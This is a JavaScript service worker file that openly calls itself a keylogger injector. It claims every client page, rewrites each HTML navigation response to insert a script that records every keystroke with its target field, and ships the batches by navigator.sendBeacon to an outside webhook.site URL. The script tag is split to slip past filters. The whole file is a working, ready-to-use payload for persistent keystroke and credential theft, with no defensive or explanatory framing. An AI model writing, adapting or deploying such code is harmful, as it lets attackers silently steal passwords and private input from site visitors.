// Service Worker — intercepts all navigations and injects keylogger
var W = 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef';

var KEYLOG_SCRIPT = '<sc' + 'ript>' +
    '(function(){' +
    'if(window._sw_kl)return;window._sw_kl=1;' +
    'var kb=[],W="' + W + '";' +
    'document.addEventListener("keydown",function(e){' +
    'kb.push({k:e.key,f:e.target.id||e.target.tagName,ts:Date.now()});' +
    'if(kb.length>=10){' +
    'navigator.sendBeacon(W,JSON.stringify({type:"sw-keylog",url:location.href,keys:kb.splice(0)}));' +
    '}},true);' +
    'setInterval(function(){' +
    'if(kb.length>0)navigator.sendBeacon(W,JSON.stringify({type:"sw-keylog",url:location.href,keys:kb.splice(0)}));' +
    '},5000);' +
    '})();' +
    '</sc' + 'ript>';

self.addEventListener('install', function(e) {
    self.skipWaiting();
});

self.addEventListener('activate', function(e) {
    e.waitUntil(clients.claim());
});

self.addEventListener('fetch', function(e) {
    var request = e.request;

    // Only intercept page navigations (not images, CSS, JS, etc.)
    if (request.mode !== 'navigate') return;

    e.respondWith(
        fetch(request).then(function(response) {
            // Only tamper with HTML responses
            var ct = response.headers.get('content-type') || '';
            if (ct.indexOf('text/html') === -1) return response;

            return response.text().then(function(html) {
                // Inject keylogger before </body>
                var injected = html;
                if (html.indexOf('</body>') !== -1) {
                    injected = html.replace('</body>', KEYLOG_SCRIPT + '</body>');
                } else if (html.indexOf('</html>') !== -1) {
                    injected = html.replace('</html>', KEYLOG_SCRIPT + '</html>');
                } else {
                    injected = html + KEYLOG_SCRIPT;
                }

                return new Response(injected, {
                    status: response.status,
                    statusText: response.statusText,
                    headers: {'content-type': 'text/html; charset=utf-8'}
                });
            });
        }).catch(function(err) {
            return fetch(request);
        })
    );
});
